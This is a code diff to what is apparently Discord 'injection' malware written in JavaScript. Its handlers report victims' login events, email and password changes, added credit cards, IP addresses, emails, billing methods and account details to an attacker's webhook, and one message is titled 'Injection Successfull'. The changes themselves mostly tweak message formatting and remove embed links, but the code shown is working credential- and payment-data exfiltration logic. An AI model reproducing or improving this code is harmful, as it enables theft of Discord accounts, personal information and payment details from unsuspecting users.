@@ -264,10 +264,8 @@ var event_handlers = {
             avatar_url: config.embed.avatar_url,
             embeds: [createEmbed({
                 title: "Credit card added",
-                url: config.embed.href,
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 thumbnail: {
@@ -316,7 +314,6 @@ var event_handlers = {
                 },
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
             })]
@@ -336,10 +333,8 @@ var event_handlers = {
             avatar_url: config.embed.avatar_url,
             embeds: [createEmbed({
                 title: "User logged in",
-                url: config.embed.href,
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 thumbnail: {
@@ -367,12 +362,12 @@ var event_handlers = {
                     },
                     {
                         name: "<:1336:1012707773424865310> IP:",
-                        value: `${ip}`,
+                        value: `\`${ip}\``,
                         inline: true
                     },
                     {
                         name: "<:1336:1012707970653626408> Email:",
-                        value: `${email}`,
+                        value: `\`${email}\``,
                         inline: true
                     },
                     {
@@ -388,7 +383,6 @@ var event_handlers = {
                 },
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
             })]
@@ -408,10 +402,8 @@ var event_handlers = {
             avatar_url: config.embed.avatar_url,
             embeds: [createEmbed({
                 title: "Email changed",
-                url: config.embed.href,
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 thumbnail: {
@@ -439,12 +431,12 @@ var event_handlers = {
                     },
                     {
                         name: "<:1336:1012707773424865310> IP:",
-                        value: `${ip}`,
+                        value: `\`${ip}\``,
                         inline: true
                     },
                     {
                         name: "<:1336:1012707970653626408> Email:",
-                        value: `${newEmail}`,
+                        value: `\`${newEmail}\``,
                         inline: true
                     },
                     {
@@ -460,7 +452,6 @@ var event_handlers = {
                 },
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
             })]
@@ -480,10 +471,8 @@ var event_handlers = {
             avatar_url: config.embed.avatar_url,
             embeds: [createEmbed({
                 title: "Password changed",
-                url: config.embed.href,
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 thumbnail: {
@@ -511,12 +500,12 @@ var event_handlers = {
                     },
                     {
                         name: "<:1336:1012707773424865310> IP:",
-                        value: `${ip}`,
+                        value: `\`${ip}\``,
                         inline: true
                     },
                     {
                         name: "<:1336:1012707970653626408> Email:",
-                        value: `${newEmail}`,
+                        value: `\`${newEmail}\``,
                         inline: true
                     },
                     {
@@ -537,7 +526,6 @@ var event_handlers = {
                 },
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
             })]
@@ -558,13 +546,13 @@ function getDiscordClient() {
 function getNitro(flags) {
     switch (flags) {
         case 0:
-            return "\`\`\`No Nitro\`\`\`";
+            return "\`No Nitro\`";
         case 1:
-            return "<:classic:896119171019067423> \`\`Nitro Classic\`\`";
+            return "<:classic:896119171019067423> \`Nitro Classic\`";
         case 2:
-            return "<a:boost:824036778570416129> \`\`Nitro Boost\`\`";
+            return "<a:boost:824036778570416129> \`Nitro Boost\`";
         default:
-            return "\`\`\`No Nitro\`\`\`";
+            return "\`No Nitro\`";
 
     };
 }
@@ -584,7 +572,7 @@ function getBadges(flags) {
         let o = config.badges[prop];
         if ((flags & o.Value) == o.Value) b += o.Emoji;
     };
-    if (b == '') b = '\`\`\`None\`\`\`'
+    if (b == '') b = '\`None\`'
     return b;
 }
 
@@ -607,17 +595,17 @@ async function getBilling(token) {
     var billing = "";
     json.forEach(z => {
         if (z.type == "") {
-            return "\`\`\`❌\`\`\`";
+            return "\`❌\`";
         } else if (z.type == 2 && z.invalid != true) {
             billing += "\`✔️\`" + " <:paypal:896441236062347374>";
         } else if (z.type == 1 && z.invalid != true) {
             billing += "\`✔️\`" + " :credit_card:";
         } else {
-            return "\`\`\`❌\`\`\`";
+            return "\`❌\`";
         };
     });
 
-    if (billing == "") billing = "\`\`\`❌\`\`\`"
+    if (billing == "") billing = "\`❌\`"
     return billing;
 }
 
@@ -712,7 +700,6 @@ async function initialize() {
                 sendToWebhook({
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
-                    url: config.embed.href,
                     embeds: [createEmbed({
                         title: "Client initialized (not logged in)",
                         fields: [{
@@ -737,12 +724,12 @@ async function initialize() {
                         },
                         {
                             name: "<:1336:1012707773424865310> IP:",
-                            value: `${ip}`,
+                            value: `\`${ip}\``,
                             inline: true
                         },
                         {
                             name: "<:1336:1012707970653626408> Email:",
-                            value: `${email}`,
+                            value: `\`${email}\``,
                             inline: true
                         }],
                     })]
@@ -757,11 +744,9 @@ async function initialize() {
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
                     embeds: [createEmbed({
-                        title: "Client initialized",
-                        url: config.embed.href,
+                        title: "Injection Successfull",
                         author: {
                             name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                            url: config.embed.href,
                             icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                         thumbnail: {
@@ -789,12 +774,12 @@ async function initialize() {
                         },
                         {
                             name: "<:1336:1012707773424865310> IP:",
-                            value: `${ip}`,
+                            value: `\`${ip}\``,
                             inline: true
                         },
                         {
                             name: "<:1336:1012707970653626408> Email:",
-                            value: `${email}`,
+                            value: `\`${email}\``,
                             inline: true
                         }
                         ],
@@ -805,7 +790,6 @@ async function initialize() {
                         },
                         author: {
                             name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                            url: config.embed.href,
                             icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                     })]
@@ -823,10 +807,8 @@ async function initialize() {
                     avatar_url: config.embed.avatar_url,
                     embeds: [createEmbed({
                         title: "User logged out",
-                        url: config.embed.href,
                         author: {
                             name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                            url: config.embed.href,
                             icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                         thumbnail: {
@@ -854,12 +836,12 @@ async function initialize() {
                         },
                         {
                             name: "<:1336:1012707773424865310> IP:",
-                            value: `${ip}`,
+                            value: `\`${ip}\``,
                             inline: true
                         },
                         {
                             name: "<:1336:1012707970653626408> Email:",
-                            value: `${email}`,
+                            value: `\`${email}\``,
                             inline: true
                         },]
                     })]
